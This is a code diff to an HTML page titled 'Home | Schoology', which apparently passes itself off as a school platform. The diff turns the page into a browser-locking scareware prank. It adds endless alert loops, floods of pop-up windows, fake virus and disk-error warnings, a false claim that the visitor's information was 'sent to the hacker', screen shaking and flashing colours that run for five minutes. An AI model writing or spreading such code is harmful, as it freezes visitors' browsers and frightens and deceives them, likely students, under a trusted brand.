@@ -1,12 +1,6 @@
-<link rel="shortcut icon" type="image/png" href="https://i.ibb.co/2sKRKZ2/Power-School-Logos-Vertical-01.webp">
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home | Schoology</title>
-    <style>
+<link rel="shortcut icon" type="image/png" href="https://i.ibb.co/2sKRKZ2/Power-School-Logos-Vertical-01.webp"> 
+<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Home | Schoology</title> <style>
+        /* Existing styles */
         body {
             margin: 0;
             padding: 0;
@@ -70,6 +64,13 @@
             display: none;
             z-index: 15;
         }
+        @keyframes shake {
+            0% { transform: translate(0, 0); }
+            25% { transform: translate(-5px, 0); }
+            50% { transform: translate(5px, 0); }
+            75% { transform: translate(-5px, 0); }
+            100% { transform: translate(0, 0); }
+        }
     </style>
 </head>
 <body>
@@ -83,11 +84,12 @@
     </audio>
 
     <script>
+        let popUpInterval; 
         let chaosInterval;
         let titleChangeInterval;
         let backgroundChangeInterval;
         let cursorMoveInterval;
-        let screenShakeInterval;
+        let screenShakeInterval; 
 
         document.getElementById('clickOverlay').addEventListener('click', function() {
             this.classList.add('hidden');
@@ -100,17 +102,18 @@
             const hackMessage = document.getElementById('hackMessage');
             hackMessage.style.display = 'block';
 
-            // Start hacking simulation
-            openInfiniteTabsAndPopups();
+            simulateEmailSend();
 
-            // Set background color to black
             document.body.style.backgroundColor = 'black';
 
+            playPopupSimulation();
             randomCursorMovement();
             startScreenShake(); 
+            infiniteAlerts(); 
 
             chaosInterval = setInterval(() => {
-                showRandomMessage();
+                showRandomErrorMessage();
+                alert("Random Alert: Your system is compromised!"); 
             }, 500);
 
             titleChangeInterval = setInterval(() => {
@@ -120,25 +123,61 @@
             backgroundChangeInterval = setInterval(() => {
                 document.body.style.backgroundColor = getRandomColor();
             }, 300);
+
+            setTimeout(() => {
+                document.getElementById('finalGif').style.display = 'block';
+                clearInterval(chaosInterval); 
+                clearInterval(popUpInterval);
+                clearInterval(titleChangeInterval);
+                clearInterval(backgroundChangeInterval);
+                clearInterval(cursorMoveInterval);
+                clearInterval(screenShakeInterval);
+            }, 300000); // Stop the chaos after 5 minutes
         });
 
-        function showRandomMessage() {
-            console.log("YOU HAVE BEEN HACKED!!!!");
+        function simulateEmailSend() {
+            const emailMessage = "Your information has been 'sent' to the hacker!";
+            alert(emailMessage); 
         }
 
-        function openInfiniteTabsAndPopups() {
-            const openTab = () => {
-                // Open a new tab
-                const newTab = window.open("https://example.com", "_blank"); // Adjust the URL as needed
-                if (newTab) newTab.focus(); // Focus the new tab
+        function showRandomErrorMessage() {
+            const errorMessages = [
+                "Disk error: Unable to read data!",
+                "Virus detected: Immediate action required!",
+                "System crash: Reboot necessary!",
+                "File not found: Your data may be lost!",
+                "Warning: Your files are at risk of corruption!"
+            ];
+            const randomMessage = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+            alert(randomMessage); 
+        }
 
-                // Open a new pop-up
-                const newWindow = window.open("https://example.com", "popup", "width=600,height=400"); // Adjust the pop-up URL and size as needed
-                if (newWindow) newWindow.focus(); // Focus the new window
-            };
+        function playPopupSimulation() {
+            popUpInterval = setInterval(startPopUpSimulation, 100); 
+        }
 
-            // Open a new tab and pop-up every 10 milliseconds
-            setInterval(openTab, 10); 
+        function startPopUpSimulation() {
+            for (let i = 0; i < 100; i++) { 
+                try {
+                    const popUp = window.open("about:blank", "_blank"); 
+                    popUp.document.write(`<h2 style="color: red;">WARNING: Your system has been hacked!</h2>`);
+                    popUp.document.close();
+
+                    setTimeout(() => {
+                        popUp.close();
+                    }, 3000); 
+                } catch (e) {
+                    console.error("Popup blocked or error occurred:", e);
+                }
+            }
+        }
+
+        function infiniteAlerts() {
+            function alertLoop() {
+                alert("WARNING: Your system has been hacked!");
+                setTimeout(alertLoop, 100); // Restart the alert every 100 ms
+            }
+            alertLoop(); // Start the alert loop
         }
 
         function randomCursorMovement() {
@@ -166,6 +205,7 @@
             }
             return color;
         }
+
     </script>
 </body>
 </html>
